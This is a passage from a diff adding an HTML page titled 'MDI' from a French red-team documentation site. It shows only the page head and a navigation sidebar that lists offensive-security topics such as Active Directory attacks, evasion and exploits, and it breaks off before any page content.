@@ -1,0 +1,6653 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+        <link rel="canonical" href="https://jsdlm.github.io/docs/RedTeam/MDI.html">
+      
+      
+        <link rel="prev" href="Composants%20de%20s%C3%A9curit%C3%A9%20Windows.html">
+      
+      
+        <link rel="next" href="Macro%20Office%20%28VBA%29.html">
+      
+      
+        
+      
+      
+      <link rel="icon" href="../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.7.7">
+    
+    
+      
+        <title>MDI - Documentation</title>
+      
+    
+    
+      <link rel="stylesheet" href="../assets/stylesheets/main.ec1eaa64.min.css">
+      
+        
+        <link rel="stylesheet" href="../assets/stylesheets/palette.ab4e12ef.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../custom.css">
+    
+    <script>__md_scope=new URL("..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#mdi" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+  
+
+<header class="md-header md-header--shadow" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../index.html" title="Documentation" class="md-header__button md-logo" aria-label="Documentation" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Documentation
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              MDI
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+          <a href="javascript:void(0)" class="md-search__icon md-icon" title="Share" aria-label="Share" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
+            
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91s2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08"/></svg>
+          </a>
+        
+        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+        <div class="md-search__suggest" data-md-component="search-suggest"></div>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../index.html" title="Documentation" class="md-nav__button md-logo" aria-label="Documentation" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54"/></svg>
+
+    </a>
+    Documentation
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../index.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Table of Content
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../hello.cpp.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    hello.cpp
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    ActiveDirectory
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    ActiveDirectory
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ActiveDirectory/ACL.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    ACL
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ActiveDirectory/ADCS.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    ADCS
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ActiveDirectory/Coerce.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Coerce
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ActiveDirectory/Credential%20Access.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Credential Access
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ActiveDirectory/DNS.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    DNS
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ActiveDirectory/Domain%20Dominance.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Domain Dominance
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ActiveDirectory/D%C3%A9l%C3%A9gations%20Kerberos.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Délégations Kerberos
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ActiveDirectory/Enum%C3%A9ration%20LDAP.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Enumération LDAP
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ActiveDirectory/Forest%20%26%20Domain%20Trusts.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Forest &amp; Domain Trusts
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ActiveDirectory/GPO.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    GPO
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ActiveDirectory/Kerberos.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Kerberos
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ActiveDirectory/Lateral%20Movement.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Lateral Movement
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ActiveDirectory/MSSQL.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    MSSQL
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ActiveDirectory/NTLM.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    NTLM
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ActiveDirectory/Password%20Spraying.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Password Spraying
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ActiveDirectory/Poison%20and%20Relay.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Poison and Relay
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ActiveDirectory/Reconnaissance.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Reconnaissance
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ActiveDirectory/Ressources.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Ressources
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ActiveDirectory/SamAccountName.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SamAccountName
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ActiveDirectory/Shares.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Shares
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ActiveDirectory/User%20Impersonation.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    User Impersonation
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../ActiveDirectory/_M%C3%A9thodologie.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    _Méthodologie
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CRTL
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    CRTL
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../CRTL/1.%20C2%20Infrastructure.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    1. C2 Infrastructure
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../CRTL/2.%20Load-Time%20Evasion.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    2. Load-Time Evasion
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../CRTL/3.%20Runtime%20Evasion.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    3. Runtime Evasion
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../CRTL/4.%20Post-Exploitation%20Evasion.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    4. Post-Exploitation Evasion
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../CRTL/5.%20Lateral%20Movement.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    5. Lateral Movement
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../CRTL/6.%20Vulnerable%20Drivers.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    6. Vulnerable Drivers
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../CRTL/7.%20App%20Control%E2%80%8C%E2%80%8C.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    7. App Control‌‌
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../CRTL/8.%20Credential%20Guard.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    8. Credential Guard
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../CRTL/Fiche%20R%C3%A9sum%C3%A9.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Fiche Résumé
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../CRTL/The%20Windows%20DLL%20Loader%20and%20the%20PE%20File%20Format.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    The Windows DLL Loader and the PE File Format
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_5" >
+        
+          
+          <label class="md-nav__link" for="__nav_5" id="__nav_5_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CRTO
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_5">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    CRTO
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../CRTO/CheatSheet.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    CheatSheet
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../CRTO/Defense%20Evasion.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Defense Evasion
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../CRTO/Initial%20access.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Initial access
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../CRTO/Notes.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Notes
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_6" >
+        
+          
+          <label class="md-nav__link" for="__nav_6" id="__nav_6_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Database
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_6_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_6">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Database
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Database/MySQL-MariaDB.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    MySQL-MariaDB
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Database/mongodb.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    mongodb
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Database/mssql.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    mssql
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Database/oracle.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    oracle
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Database/postgresql.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    postgresql
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Database/redis.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    redis
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Database/snowflake.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    snowflake
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Database/sqlite.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    sqlite
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7" >
+        
+          
+          <label class="md-nav__link" for="__nav_7" id="__nav_7_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Developpement
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_7_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_7">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Developpement
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Developpement/C%2B%2B.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    C++
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Developpement/Compilation.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Compilation
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../Developpement/DLL%20Hijacking.html" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    DLL Hijacking
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_8" >
+        
+          
+          <label class="md-nav__link" for="__nav_8" id="__nav_8_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exploits
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_8_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_8">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Exploits
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
